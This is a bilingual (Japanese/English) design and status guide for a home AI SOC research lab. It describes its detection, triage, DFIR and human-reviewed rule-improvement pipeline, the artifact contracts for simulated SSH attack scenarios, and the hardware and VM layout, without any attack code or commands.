# AI SOC Lab Master Guide

2台PC構成のAI SOC研究ラボを、Phaseごとに迷わず進めるための統合資料。

> Last updated: 2026-07-05
> Source: `docs/roadmap/phase0.md`〜`phase8.md` と Phase6 follow-on docs の内容を統合。

---

# 1. Lab Goal

本ラボの目的は、以下を一つの環境で継続的に学習・改善できるようにすることです。

- Adversary Simulation
- Detection Engineering
- Correlation
- AI Triage
- Investigation Analysis
- Case Management
- Action Planning / Approval
- Investigation / DFIR / External Integrations
- Deception
- Automated Improvement Loop

最終的な研究ループは以下です。

```text
Attack / Noise / Deception
        ↓
Telemetry Collection
        ↓
Detection
        ↓
Correlation
        ↓
Incident Builder
        ↓
Triage
        ↓
Investigation
        ↓
Case
        ↓
Action
        ↓
Execution / Approval
        ↓
DFIR / External Integrations
        ↓
Rule Improvement
        ↓
Attack Again
```

防御側の telemetry → parser → normalization → detection → correlation →
triage → investigation の詳細な処理責務と信頼境界については、
[Defender Event Processing Flow](architecture/defender-event-processing-flow.md)
を参照してください。

設計思想:

- Detect は deterministic
- AI は analyst / triage / investigation / planning
- Deception は high-confidence detection を作る
- Normal activity / noise を混ぜて現実的なSOCを再現する
- 危険操作は approval gate の外に出す
- 比較可能性を維持したまま段階的に自動化を進める

---

## 1.1 Scenario-aware Artifact Selection
本ラボでは、単純に検知されたイベントを並べるのではなく、
シナリオに応じて「どのアーティファクトを主役とするか」を決定する。

例:
- scenario_003: process_exec を主役（execution）
- scenario_004: authorized_keys_modification を主役（persistence installation）
- scenario_005: ssh_key_login を主役（persistence reuse）
- scenario_006: process_exec を主役（key reuse 後の post-login action）

これにより、
- execution / persistence / privilege escalation など異なる攻撃ドメインを正しく表現できる
- case / investigation / response の一貫性が向上する

この設計は Phase6 における重要な進化ポイントである。

---

## 1.2 Atomic Detection DSL and Correlation-First Entry

本 lab では、検知・調査・ケース生成をシナリオごとのハードコードに依存させず、まず backend 非依存の atomic detection 出力を共通契約として定義する。

基本方針は以下。

```text
atomic detection DSL
  ↓
canonical detection output
  ↓
dedupe
  ↓
correlation
  ↓
incident / triage / investigation / case
```

### Source of truth

- DSL = source of truth
- canonical detection output = lab 内の共通契約
- Wazuh = deploy / search target

### feature 層

- `behavior_features` = detection が付与する観測事実
- `derived_features` = triage による意味付け
- `enriched_features` = investigation による文脈補強
- `assessment` = 最終判断

detection では原則として `behavior_features` のみを付与し、結論寄りの意味付けは後段に委ねる。

### Correlation-first incident entry

従来の process-first incident 生成だけでは、persistence 主体のシナリオを扱いにくい。
そのため、atomic detections を dedupe / correlation し、その結果から incident を生成できる設計を導入する。

例:
- `ssh_failed_login`
- `ssh_success_login`
- `authorized_keys_modification`

この 3 つを correlation し、`authorized_keys_modification` を primary artifact とする incident を生成する。

### 意義

この設計により、execution だけでなく persistence や persistence reuse など、異なる攻撃ドメインを共通基盤上で扱いやすくなる。


## 1.3 Attacker-side Artifact Contracts

Attacker Agent 側では、攻撃実行の結果を以下の artifact に分離する。

```text
attack_result.json
  攻撃runのサマリ

attack_execution_log.json
  shell backend / runner の実行ログ

attack_observed_effects.json
  攻撃側で観測した効果
```

重要な境界:

```text
attacker-side observed effect != defender-side observed artifact
```

例:

- `ssh_login_succeeded` は `ssh_key_login` に対応する攻撃側観測である
- `payload_execution_succeeded` は `process_exec` に対応する攻撃側観測である
- ただし、攻撃側で観測できたことは、防御側で検知できたことを意味しない

現時点では、attacker-agent は shell execution evidence から以下を生成できる。

```text
scenario_004:
  ssh_bruteforce_attempted        -> ssh_failed_login
  ssh_login_succeeded             -> ssh_success_login
  authorized_keys_write_succeeded -> authorized_keys_modification

scenario_005:
  ssh_login_succeeded             -> ssh_key_login

scenario_006:
  ssh_login_succeeded             -> ssh_key_login
  payload_execution_succeeded     -> process_exec
```

この artifact は現在、`observed_effects_alignment` により defender-side observed artifacts と比較できる。


## 1.4 Structured Runner Output and Observed Effects Alignment

shell runner の stdout marker に過度に依存しないため、attacker-agent は structured runner output convention を導入している。

基本形式:

```text
ATTACK_EVENT_JSON: {"event_type":"ssh_login_succeeded","artifact":"ssh_key_login","status":"observed","confidence":"medium"}
```

重要な境界:

```text
ATTACK_EVENT_JSON = attacker-side structured evidence
ATTACK_EVENT_JSON != defender-side telemetry
ATTACK_EVENT_JSON != defender-side detection
```

現時点では以下が成立している。

- `ATTACK_EVENT_JSON:` parser helper / tests が存在する
- scenario_004 / 005 / 006 runner は structured events を出力する
- `attack_observed_effects.json` は structured runner events がある場合、それを優先する
- `attack_execution_log.json` は valid な `ATTACK_EVENT_JSON:` 行がある場合、additive な `structured_events` を含む
- `structured_events` は raw `stdout` / `stderr` や execution events を置き換えない
- structured events が無い場合は legacy stdout marker / exit_code fallback を維持する
- structured runner events は scenario_004 / 005 / 006 で smoke 確認済み
  - scenario_004: `ssh_bruteforce_attempted` → `ssh_failed_login`
  - scenario_004: `ssh_login_succeeded` → `ssh_success_login`
  - scenario_004: `authorized_keys_write_succeeded` → `authorized_keys_modification`
  - scenario_005: `ssh_login_succeeded` → `ssh_key_login`
  - scenario_006: `ssh_login_succeeded` → `ssh_key_login`
  - scenario_006: `payload_execution_succeeded` → `process_exec`
- `observed_effects_alignment` は attacker-side observed effects と defender-side observed artifacts を比較する additive signal である
- 既存の `overall_result` / `detected` / verdict behavior は変更しない
- Rule Improvement Agent は `evaluation_result.observed_effects_alignment` から
  `observed_effects_alignment_signals.json` を生成できる
- `candidate_review.md` は observed-effects alignment signals を human review 用に表示する
- observed-effects signals は `rule_candidates.yaml` に自動混入させず、review input として扱う
- shell backend contract static tests は runner path / executable bit / timeout / `state_changing` / inline shell field boundaries を確認する
- `docs/operations/smoke_runbook.md` は structured runner / observed-effects smoke checks を記録する


## 1.5 Comparison Harness and Improvement Cycle

Phase6 拡張MVPでは、単発 pipeline に加えて、**比較可能な改善ループ**を導入した。

現在の比較 spine は triage だけでなく、investigation と action planning まで到達している。

```text
triage_result comparison
  ↓
investigation_result comparison
  ↓
action_result comparison
```

基本形は以下。

```text
current / champion
        +
variant / challenger
        +
rule baseline
        ↓
compare.json
        ↓
judge_result.json
        ↓
Rule Improvement Agent
        ↓
rule_candidates.yaml
prompt_candidates.yaml
promotion_recommendation.yaml
parser_candidates.yaml
rule_improvement_export_artifact_validation_summary.json
observed_effects_alignment_signals.json
candidate_review.md
        ↓
batch validation
        ↓
human review
```

current / variant は champion / challenger として扱う。

```text
triage_ai_current = 現在の採用版 / baseline / champion
triage_ai_variant = 改善候補 / challenger
triage_ai_variant_next = 次の改善候補
```

promotion は単発 winner だけでは決めない。
`scenario_004 / 005 / 006` のような複数 scenario を batch compare し、primary artifact coverage / overclaim control / evidence grounding / response fitness を横断確認したうえで human review する。

現段階では以下まで成立している。

- triage comparison harness
- investigation comparison harness
- action comparison harness
- compare / judge schema
- generic rubric
- response keyword の must-have / nice-to-have 評価
- evidence-aware compare / judge refinement
- action compare / judge refinement
- minimal Rule Improvement Agent
- promotion recommendation
- batch compare runner
- action_result から collection_request への接続
- `collection_request.json` の後続として `collection_result.json` contract を設計
- observed-effects alignment signals の生成と candidate review への表示

## 1.6 Current Implementation Snapshot

現時点の lab は、以下の到達点にある。

```text
attack
  ↓
detection
  ↓
incident
  ↓
triage
  ↓
pre-case investigation
  └─ investigation_result.json
  ↓
initial case
  └─ case.json
  ↓
action planning
  └─ action_result.json
  ↓
collection request / approval (when required) / execution
  └─ collection_request.json
  ↓
collection outcome
  └─ collection_result.json
  ├─ outcome-only case enrichment: collection summary / evidence refs
  └─ post-action DFIR run workflow MVP / future external integration workflow
       ↓
     comparison / judge / improvement follow-ons
```

The collection-result boundary is implemented through the schema, mock generation, and
append-only case enrichment. Run-based mock collection now writes the controlled
`forensics/mock/Linux.Syslog.SSHLogin.json` output, references it through `output_refs`,
and the dedicated post-action DFIR workflow reads it without changing the pre-case
`investigation_result.json` or `case.json`. The optional, default-off
`--run-post-action-dfir` process-pipeline flag connects these stages and writes
`data/runs/<run_id>/post_action_dfir_investigation_result.json`. The pipeline preserves
repo-local imports for child Python scripts, so manual `PYTHONPATH=.` setup is not required.
The optional, default-off `--export-ri-review-input` flag then writes
`data/runs/<run_id>/rule_improvement_review_input.json`. With both flags, DFIR runs
first; by itself, export requires an existing post-action result and fails closed if it is
missing.

```text
collection_result.json
  ├─ outcome-only case enrichment: collection summary / evidence refs (implemented)
  └─ post-action DFIR run workflow MVP / future external integration workflow
       ↓
     factual observations, evidence gaps, and follow-up pivots
       ↓
     optional external case update / future executor-DFIR comparison
```

Defense side:

- Phase0: SSH brute force を起点とした最小 SOC pipeline が成立
- Phase1: parser / detection / correlation / incident-builder が成立
- Phase2: AI triage と action plan 生成が成立
- Phase3: attacker-agent と run isolation / evaluation が成立
- Phase4: case-agent と TheHive / Velociraptor 連携準備が成立
- Phase5: auditd による process telemetry と process-chain detection が成立
- Phase6: behavior-feature-centered な compare-ready improvement loop が成立
- DFIR follow-on: `collection_result.json` schema / mock generation / case append-only enrichment、supported artifacts の `forensics/mock/` output generation / `output_refs` 接続、post-action DFIR run workflow MVP / `--run-post-action-dfir` optional integration が成立
- post-action parser coverage は `Linux.Syslog.SSHLogin`、`Linux.ProcessList`、`Linux.BashHistory`。ProcessList は collection 時点の point-in-time snapshot としてのみ解釈する。BashHistory は weak / user-controlled / timing-sensitive evidence として扱い、entry は command execution を確認せず、不在も non-execution や host-clean / benign の根拠にしない
- deterministic post-action DFIR result harness MVP が成立
  - `scripts/run_post_action_dfir_harness.py` が `post_action_dfir_investigation_result.json` を `collection_result.json` に対して評価
  - example workflow: `workflows/post_action_dfir_harness_example.yaml`
  - rubric: `rubrics/post_action_dfir_generic_v1.yaml`
  - outputs: `judge_input.json` / schema-valid `judge_result.json` / `summary.md` / `metadata.json`
  - dimensions: evidence inventory coverage / observed fact grounding / limitation and gap clarity / post-action boundary safety / recommended pivot quality
  - harness support classification は available / parsed の `Linux.ProcessList` と `Linux.BashHistory` を supported として評価
  - BashHistory fact contract: `shell_history_observation`、`evidence_strength: weak`、`user_controlled`、`timing_sensitive`、`shell_history_entry_not_confirmed_execution`
  - evaluation-only であり、pre-case investigation / case / action approval / containment / Rule Improvement promotion state は変更しない
- implemented handoff: `scripts/export_rule_improvement_review_input.py` validates source and output schemas and deterministically projects post-action findings into review-only `rule_improvement_review_input.json`; review and promotion flags remain locked down, no candidate or promotion artifacts are generated, and human classification remains required before any later candidate work
- optional pipeline handoff: `scripts/run_process_pipeline.py --export-ri-review-input` is default-off; it runs after `--run-post-action-dfir` when combined, requires an existing post-action result when used alone, and fails closed without fabricating output when the source is missing
- human classification boundary: human-operated `scripts/create_rule_improvement_signal_classification.py` reads a schema-valid review input plus human decisions, reviewer ID, and timestamp, then writes schema-valid `rule_improvement_signal_classification.json`; it resolves and copies signal provenance, derives eligibility, and locks candidate generation and promotion off. It is not AI integration or candidate generation, which remain future work
- AI-assisted review draft boundary: `schemas/rule_improvement_ai_review_draft.schema.json` is implemented for suggestion-only labels, rationales, missing requirements, next steps, evidence caveats, review questions, and confidence rationales; it locks decision/generation/promotion flags off and rejects human-decision, eligibility, candidate, promotion, and state fields. The human helper remains the decision path
- AI review prompt/input boundary: `scripts/export_ai_review_draft_prompt_input.py` deterministically validates and projects schema-valid review input into schema-valid minimized prompt input; it writes sorted pretty JSON, preserves grounded IDs/refs/gaps/limitations/caveats, excludes raw logs and secrets, and marks evidence-derived text as untrusted. Evidence refs are references only and are not read
- AI review prompt/input schema: `schemas/rule_improvement_ai_review_draft_prompt_input.schema.json` is implemented for normalized source context, signals, fact summaries, gaps/limitations, caveats, questions, and a locked output contract; candidate hints remain hypotheses with `candidate_generation_allowed: false`, retained fragments require untrusted marking, and the schema adds no prompt, model, runtime, pipeline, classification, candidate, promotion, or mutation behavior
- deterministic `scripts/export_ai_review_draft_prompt_bundle.py` materializes the versioned prompt plus normalized prompt input as a local JSON model-handoff bundle. It includes exact output provenance (`draft_id`, `source_review_input_id`, `source_review_input_ref`) in `prompt_text`. Model/network execution flags remain false; it has no pipeline integration and creates no model response, worksheet, decisions, classification, candidates, promotion, or state mutation
- deterministic `scripts/import_ai_review_draft_model_output.py` is the model-output acceptance boundary: it executes no model and imports only canonical-schema-valid, provenance-consistent, suggestion-only JSON with locked safety flags and known signal refs. It performs no repair, pipeline integration, downstream review generation, candidate/promotion action, or state mutation
- manual-only `scripts/run_ai_review_draft_lmstudio_model.py` is the local/private-lab challenger runner. It requires `--allow-model-execution`, permits loopback LM Studio by default, and requires `--allow-private-lan-endpoint` for explicit RFC1918/link-local lab hosts. In this public snapshot, the private lab address is replaced with the documentation-only placeholder `http://192.0.2.7:1234/v1`; replace it with the appropriate RFC1918 address for the isolated lab before execution. The runner rejects public/cloud endpoints, has no pipeline integration, and writes untrusted candidate output that must pass through the importer
- manual-only `scripts/run_ai_review_draft_openai_model.py` is the stable external runner. It requires both `--allow-model-execution` and `--allow-external-api`, relies on environment `OPENAI_API_KEY`, and uses the Responses API with strict Structured Outputs from an OpenAI-compatible projection of the canonical AI review draft schema. It sends only bundle prompt text, reads no evidence refs/raw logs, has no pipeline/candidate/promotion behavior, and leaves untrusted output acceptance to the importer
- the prompt-input exporter does not execute `prompts/rule-improvement/ai_review_draft_v1.md`, run a model, create `rule_improvement_ai_review_draft.json` or decisions JSON, invoke the human classification helper, or mutate operational / Rule Improvement state
- deterministic mock `scripts/generate_mock_ai_review_draft.py` is implemented as the baseline for schema and downstream-review testing; it applies fixed conservative labels and caveats without prompt/model/API/network execution, human classification, candidate generation, promotion, or state mutation
- deterministic `scripts/compare_ai_review_drafts.py` compares already-produced AI review drafts only. It reports schema validity, schema pass rate, label disagreement, and missing signal coverage, but is descriptive rather than a judge: it does not execute models, call the importer, read raw logs or evidence refs, select a winner, classify signals, generate candidates, recommend promotion, or mutate state
- a mock-vs-OpenAI smoke comparison succeeded: both candidates were schema-valid, schema pass rate was 1.0, no signal coverage was missing, and one label disagreement was surfaced for human review. Generated `data/runs/**` artifacts remain local and uncommitted; the smoke validates difference visibility, not a decision

- candidate-review downstream handoff is implemented through deterministic local artifacts: `rule_improvement_candidate_generation_input.json`, `rule_improvement_candidate_draft.json`, `rule_improvement_candidate_review_worksheet.md`, `rule_improvement_candidate_review_decisions_template.json`, completed `rule_improvement_candidate_review_decisions.json`, `rule_improvement_candidate_creation_input.json`, proposal-only `rule_improvement_candidate_proposals_v2.json`, `rule_improvement_proposal_review_decisions_template.json`, canonical `rule_improvement_proposal_review_decisions.json`, non-applying `rule_improvement_concrete_candidate_bundle_v1.json`, and optional generator diagnostics. These artifacts preserve IDs/refs/English enums/evidence refs/limitations and explicit human decision provenance while keeping approval, deployment, baseline update, apply, and promotion out of scope
- Japanese overview for this artifact chain: `docs/design/rule-improvement/rule_improvement_overview_ja.md`
- optional Japanese candidate review worksheet rewrite is implemented as a read-only human aid. Prompt-bundle generation produces `rule_improvement_candidate_review_worksheet_ja_prompt_bundle.json`; the local LM Studio API runner writes only untrusted `rule_improvement_candidate_review_worksheet_ja_model_output.json`; the existing importer/invariant checker is the only path to `rule_improvement_candidate_review_worksheet_ja_rewritten.md`. Canonical JSON artifacts must not be translated, and IDs, refs, enum values, file paths, safety flags, and backtick-enclosed values must be preserved exactly
- the v2 proposal schema is implemented, including enforced `candidate_type` / `allowed_next_artifact_type` mapping. Standalone deterministic `scripts/generate_rule_improvement_candidate_proposals_v2.py` can produce proposal-only v2 artifacts from reviewed candidate-creation input and optional non-proposal diagnostics for skipped unsupported future schema-valid candidate types. Proposal v2 artifacts and diagnostics are not approval to apply, deploy, update baselines, or promote
- the proposal review decisions schema is implemented, along with deterministic template export and importer/validator scripts. Human-completed proposal review decisions can now be canonicalized into `rule_improvement_proposal_review_decisions.json`; `accept_for_conversion` remains conversion-review-only and is not approval to apply, deploy, update baselines, or promote
- the concrete candidate bundle v1 schema is implemented at `schemas/rule_improvement_concrete_candidate_bundle_v1.schema.json`, and standalone deterministic `scripts/convert_rule_improvement_proposals_to_concrete_candidate_bundle.py` converts canonical `rule_improvement_proposal_review_decisions.json` plus source `rule_improvement_candidate_proposals_v2.json` into non-applying `rule_improvement_concrete_candidate_bundle_v1.json`. The converter validates decisions, proposals, and output bundle schemas, checks source proposal SHA and decision/proposal consistency before writing output, converts only `accept_for_conversion` decisions into `converted_candidates`, and records `reject`, `defer`, `split_required`, and `needs_more_evidence` decisions as `skipped_decisions`
- the concrete candidate bundle is not a legacy candidate artifact and is not apply approval, deployment approval, baseline update approval, or promotion approval. `accept_for_conversion` remains conversion-review-only; it is not approval to apply, deploy, update baselines, or promote
- the standalone deterministic Phase 1 legacy-compatible rule/prompt exporter is implemented at `scripts/export_rule_improvement_legacy_rule_prompt_candidates.py`, with focused tests at `tests/test_export_rule_improvement_legacy_rule_prompt_candidates.py`. It reads `rule_improvement_concrete_candidate_bundle_v1.json`, exports only `candidate_type: rule` and `candidate_type: prompt` into `rule_candidates.yaml` and `prompt_candidates.yaml`, validates the concrete candidate bundle input schema plus legacy rule and prompt candidate output schemas, writes outputs only after validation succeeds, can optionally write non-candidate diagnostics for skipped or unsupported candidates, refuses unsafe output paths and output path collisions, and preserves source bundle/candidate/proposal/review backreferences where legacy schemas permit
- deterministic tmp-path integration smoke coverage is implemented at `tests/test_rule_improvement_phase1_legacy_export_chain_smoke.py`. It creates synthetic schema-valid fixtures under `tmp_path` and proves the artifact chain from `rule_improvement_candidate_proposals_v2.json` plus `rule_improvement_proposal_review_decisions.json` through `rule_improvement_concrete_candidate_bundle_v1.json` to `rule_candidates.yaml` / `prompt_candidates.yaml`; rule candidates appear only in rule output, prompt candidates appear only in prompt output, `promotion_review` and non-accept decisions are reported in diagnostics rather than exported, `promotion_recommendation.yaml` is not created, and generated rule/prompt outputs do not contain apply/deploy/promote-like fields. This is a local-development / WSL-friendly artifact-chain smoke test, not an attack/victim-log end-to-end test, and it does not require victim logs, Wazuh, rsyslog, Hydra output, Proxmox, Kali, Ubuntu victim, or existing `data/runs/**` artifacts
- the Phase 1 exporter is non-applying, non-deploying, and non-promoting. `rule_candidates.yaml` and `prompt_candidates.yaml` are candidate artifacts only; they are not apply approval, deployment approval, baseline update approval, prompt update approval, or promotion approval. `promotion_review`, `parser`, `telemetry`, and `correlation` remain out of Phase 1 export. Diagnostics are not candidate artifacts. Generated `data/runs/**` artifacts remain run outputs and should not be committed
- the parser legacy export contract is documented at `docs/design/rule-improvement/rule_improvement_parser_legacy_export_contract.md`. The parser candidate schema is implemented at `schemas/parser_candidates_schema.json`, with focused tests at `tests/test_parser_candidates_schema.py`; standalone deterministic `scripts/export_rule_improvement_parser_candidates.py` exports accepted `candidate_type: parser` concrete candidates into schema-valid candidate-only `parser_candidates.yaml`, can optionally write diagnostics, rejects approval/apply/deploy/promote-like fields, refuses unsafe output paths, and writes only after validation succeeds. Deterministic tmp-path parser export chain smoke coverage is implemented at `tests/test_rule_improvement_parser_export_chain_smoke.py`; it proves the local artifact chain from proposal/review decisions through the concrete bundle to schema-valid `parser_candidates.yaml`, requires no victim logs, Wazuh, rsyslog, Hydra output, Proxmox, Kali, Ubuntu victim, or existing `data/runs/**` artifacts, and remains candidate-only. Parser process-pipeline wiring, parser apply workflow, parser deployment workflow, and automatic parser update are not implemented
- the standalone deterministic promotion recommendation exporter is implemented at `scripts/export_rule_improvement_promotion_recommendation.py`, with focused tests at `tests/test_export_rule_improvement_promotion_recommendation.py`. It reads `rule_improvement_concrete_candidate_bundle_v1.json`, considers only converted `candidate_type: promotion_review` items with `allowed_next_artifact_type: promotion_review_recommendation`, validates bundle input and legacy promotion recommendation output schemas, writes recommendation-only `promotion_recommendation.yaml` only after validation succeeds, can optionally write non-recommendation diagnostics for skipped items, refuses unsafe paths and output collisions, and preserves bundle/candidate/proposal/review backreferences where the legacy schema permits
- deterministic tmp-path promotion recommendation export-chain smoke coverage is implemented at `tests/test_rule_improvement_promotion_recommendation_export_chain_smoke.py`. It creates synthetic schema-valid fixtures under `tmp_path` and proves `rule_improvement_candidate_proposals_v2.json` plus `rule_improvement_proposal_review_decisions.json` can convert into `rule_improvement_concrete_candidate_bundle_v1.json`, preserve schema-safe promotion-review proposal payload fields into concrete bundle payloads, and export schema-valid recommendation-only `promotion_recommendation.yaml`. Non-promotion candidates and non-accept/skipped decisions are not included in the recommendation output, diagnostics report unsupported/skipped items deterministically, and the promotion exporter does not create `rule_candidates.yaml` or `prompt_candidates.yaml`. This is local-development / WSL-friendly and does not require victim logs, Wazuh, rsyslog, Hydra output, Proxmox, Kali, Ubuntu victim, or existing `data/runs/**` artifacts
- proposal v2 supports optional schema-safe `payload` fields for later narrowing exporters. The bundle converter preserves those optional payload fields into concrete candidate bundle payloads, but fails closed if optional payload attempts to override base metadata such as `target`, `source_signal_ref`, `source_label`, `source_fact_ids`, `required_evidence_refs`, `priority`, or `review_status`
- deterministic validation summary reporter is implemented at `scripts/summarize_rule_improvement_export_artifacts.py`, with focused tests at `tests/test_summarize_rule_improvement_export_artifacts.py`. It inspects already-generated RI export artifacts such as the concrete bundle, `rule_candidates.yaml`, `prompt_candidates.yaml`, `promotion_recommendation.yaml`, optional `parser_candidates.yaml`, and export diagnostics, then writes `rule_improvement_export_artifact_validation_summary.json` with presence, schema validation, cross-artifact consistency, diagnostics consistency, safety checks, and provenance/backreference checks. `parser_candidates.yaml` remains optional and is validated only when present; parser diagnostics remain diagnostics only. It is non-mutating validation/reporting only, not human review, and not apply, deployment, baseline update, prompt update, parser update, telemetry update, correlation update, or promotion approval
- the validation summary schema is implemented at `schemas/rule_improvement_export_artifact_validation_summary.schema.json`, with focused schema tests at `tests/test_rule_improvement_export_artifact_validation_summary_schema.py`. The reporter validates `rule_improvement_export_artifact_validation_summary.json` against this schema before writing; schema validation failure is fail-closed and does not write the summary output. This does not change safety semantics, invoke exporters, create rule candidates, prompt candidates, parser candidates, or promotion recommendations, update active agents or production state, or add apply, deployment, baseline update, prompt update, parser update, telemetry update, correlation update, promotion workflow, or automatic promotion behavior
- disabled-by-default process-pipeline wiring is implemented in `scripts/run_process_pipeline.py` behind `--enable-ri-export-validation-summary`, as defined by `docs/design/rule-improvement/rule_improvement_export_validation_summary_pipeline_wiring_contract.md`. When explicitly enabled, it runs after existing RI export steps, calls the summary reporter for the current run directory, writes only `rule_improvement_export_artifact_validation_summary.json`, preserves reporter schema validation before write and fail-closed failure propagation, does not invoke exporters, and does not create `rule_candidates.yaml`, `prompt_candidates.yaml`, `promotion_recommendation.yaml`, or `parser_candidates.yaml`. Default pipeline behavior is unchanged
- the Rule Improvement export MVP is complete for the current candidate-generation boundary: reviewed proposal decisions can be converted into a concrete candidate bundle, narrowed into rule, prompt, promotion-review, and parser export artifacts, and checked by the export artifact validation summary. This MVP remains non-applying, non-deploying, non-mutating, review-oriented, and does not implement baseline updates, prompt updates, parser updates, telemetry updates, correlation updates, a promotion workflow, or automatic promotion
- deterministic tmp-path export validation summary chain smoke coverage is implemented at `tests/test_rule_improvement_export_validation_summary_chain_smoke.py`. It uses synthetic schema-valid fixtures under `tmp_path` and proves the implemented chain from `rule_improvement_candidate_proposals_v2.json` plus `rule_improvement_proposal_review_decisions.json` through `rule_improvement_concrete_candidate_bundle_v1.json`, schema-valid `rule_candidates.yaml` / `prompt_candidates.yaml`, schema-valid recommendation-only `promotion_recommendation.yaml`, optional schema-valid `parser_candidates.yaml`, and `rule_improvement_export_artifact_validation_summary.json`. The smoke verifies the validation summary reporter reads already-generated artifacts, reports `overall_status: pass` with no errors, lists the concrete bundle, rule candidates, prompt candidates, promotion recommendation, and parser candidates as present when generated, passes schema validation, safety checks, and consistency checks, treats diagnostics as diagnostics only, excludes skipped/non-accept candidate IDs from rule/prompt/promotion/parser outputs, and does not rewrite primary export artifacts. It is local-development / WSL-friendly, not an attack/victim-log end-to-end smoke, and requires no victim logs, Wazuh, rsyslog, Hydra output, Proxmox, Kali, Ubuntu victim, or existing `data/runs/**` artifacts
- the validation summary reporter does not invoke exporter scripts and does not create `rule_candidates.yaml`, `prompt_candidates.yaml`, `promotion_recommendation.yaml`, or `parser_candidates.yaml`; those artifacts are created only by their exporters. `promotion_recommendation.yaml` remains recommendation-only, `parser_candidates.yaml` remains candidate-only and optional, and no apply, deployment, baseline update, prompt update, parser update, telemetry update, correlation update, promotion workflow, or automatic promotion is implemented
- `promotion_recommendation.yaml` is recommendation-only. It is not apply approval, deployment approval, baseline update approval, prompt update approval, or promotion approval; the exporter is non-applying, non-deploying, and non-promoting, no active-agent or production state is changed, and later explicit human review plus a separate promotion workflow is required before any state-changing promotion
- still not implemented: parser process-pipeline wiring, telemetry legacy export, correlation legacy export, attack-to-detection-to-RI E2E smoke, apply workflow, deployment workflow, baseline update workflow, prompt update workflow, parser update workflow, telemetry update workflow, correlation update workflow, promotion workflow, or automatic promotion
Current intended AI-assisted Rule Improvement review flow:

```text
rule_improvement_review_input.json
  -> rule_improvement_ai_review_draft_prompt_input.json
  -> rule_improvement_ai_review_draft_prompt_bundle.json
  -> manual model/mock/OpenAI/LM Studio execution
  -> untrusted rule_improvement_ai_review_draft_model_output.json
  -> importer acceptance boundary
  -> canonical rule_improvement_ai_review_draft.json / named draft artifacts
  -> optional compare_ai_review_drafts.py descriptive comparison
  -> human_review_worksheet.md
  -> optional human_review_packet_ja.md
  -> human_decisions_template.json
  -> human-completed decisions JSON
  -> rule_improvement_signal_classification.json
  -> rule_improvement_candidate_generation_input.json
  -> rule_improvement_candidate_draft.json
  -> rule_improvement_candidate_review_worksheet.md
  -> optional rule_improvement_candidate_review_worksheet_ja_prompt_bundle.json
  -> optional LM Studio API runner
  -> untrusted rule_improvement_candidate_review_worksheet_ja_model_output.json
  -> importer invariant check
  -> optional rule_improvement_candidate_review_worksheet_ja_rewritten.md
  -> rule_improvement_candidate_review_decisions_template.json
  -> human-completed candidate review decisions JSON
  -> rule_improvement_candidate_review_decisions.json
  -> rule_improvement_candidate_creation_input.json
  -> optional standalone rule_improvement_candidate_proposals_v2.json
     plus optional generator diagnostics
  -> optional rule_improvement_proposal_review_decisions_template.json
  -> human-completed proposal review decisions JSON
  -> rule_improvement_proposal_review_decisions.json
  -> scripts/convert_rule_improvement_proposals_to_concrete_candidate_bundle.py
  -> rule_improvement_concrete_candidate_bundle_v1.json
  -> optional scripts/export_rule_improvement_legacy_rule_prompt_candidates.py
  -> optional rule_candidates.yaml / prompt_candidates.yaml
  -> optional scripts/export_rule_improvement_promotion_recommendation.py
  -> optional promotion_recommendation.yaml
  -> optional scripts/export_rule_improvement_parser_candidates.py
  -> optional parser_candidates.yaml
  -> optional scripts/summarize_rule_improvement_export_artifacts.py
  -> optional rule_improvement_export_artifact_validation_summary.json
```
- optional, default-off `--export-ai-review-draft-prompt-input` and `--generate-mock-ai-review-draft` pipeline flags invoke only the deterministic local exporter/mock generator in stage order. They execute no prompt or model, fail closed on missing inputs, and create no decisions, classification, candidates, or promotion recommendation. Default-on or process-pipeline model execution remains later
- deterministic local `scripts/export_ai_review_draft_human_worksheet.py` validates a draft and exports a Markdown worksheet with suggestions and blank reviewer fields. Optional, default-off `--export-ai-review-draft-human-worksheet` integration runs after draft generation when combined and fails closed without an existing draft. It reads no evidence refs, executes no prompt/model, and creates no decisions JSON, classification, candidates, promotion recommendation, or state mutation; the reviewer must author decisions separately
- deterministic `scripts/export_ri_signal_classification_decisions_template.py` validates an AI draft and writes sorted JSON containing source metadata, exact signal refs, allowed labels, and human-edit placeholders. Optional, default-off `--export-ri-signal-classification-decisions-template` integration requires an existing draft, runs last when combined with the deterministic review stages, and does not require worksheet output. It creates no completed decisions/classification, eligibility, helper invocation, candidates, promotion, or state mutation
- operator handoff steps, artifact meanings, human-edit boundaries, and smoke checks are documented in `docs/runbooks/ai_assisted_rule_improvement_review_handoff.md`

Offense side:

- attacker-agent Phase A: dispatcher / loader / validator / backend selector
- attacker-agent Phase B: `attack_scenario_v1` schema と scenario_004 / 005 / 006 migration
- attacker-agent Phase C: `attack_result` / `attack_execution_log` / `attack_observed_effects` artifact contracts
- `observed_effects_alignment` による attacker-side observation と defender-side detection の比較
- scenario_004 / 005 / 006 の structured runner event coverage と `attack_execution_log.structured_events`
- `observed_effects_alignment_signals.json` による Rule Improvement review signal integration

重要な現状判断:

- Phase6 extended MVP は完了扱い
- observed-effects Rule Improvement review signal integration も完了扱い
- Rule Improvement export MVP は current candidate-generation boundary として完了扱い
- 残タスクは Phase6 blocker ではなく follow-on work として扱う
- Phase7 agentic deception artifact foundation は完了済みで、scenario YAML / runner implementation は deferred
- 現在の主軸は Phase5 / Phase6 follow-on の Windows cross-platform expansion。詳細は [Defender Event Processing Flow](architecture/defender-event-processing-flow.md) と [RoadmapのWindows Cross-Platform Expansion](roadmap/roadmap.md#windows-telemetry-mvp--cross-platform-expansion) を参照する


# 2. Hardware Layout

## Node1: Attack / Victim Lab

既存PC:
- TRIGKEY Speed S5 Pro
- Ryzen 7 5800H
- 32GB RAM
- 1TB NVMe

役割:
- attacker
- victim hosts
- AD / Windows / Linux
- honeypot / deception targets
- background activity generation

## Node2: SOC Core

2台目PC:
- GMKtec NucBox K8 Plus
- Ryzen 7 8845HS
- 64GB RAM
- 1TB NVMe

役割:
- log pipeline
- detection engine
- correlation engine
- Wazuh
- TheHive
- Velociraptor
- triage / investigation
- action / orchestration
- rule improvement
- AI deception

## Node3: Future AI Engine (optional)

将来追加するAI専用ノード。

役割:
- Ollama
- Qwen
- embeddings
- local AI SOC analyst
- future enrichment / RAG / memory workloads

---

# 3. Recommended VM Layout

## Node1 (Attack / Victim)

| VM | Role | Suggested Spec |
|---|---|---|
| kali-attacker | attacker / tooling | 4 vCPU / 8GB / 80-100GB |
| ubuntu-victim01 | SSH target / auth.log | 2 vCPU / 4GB / 50GB |
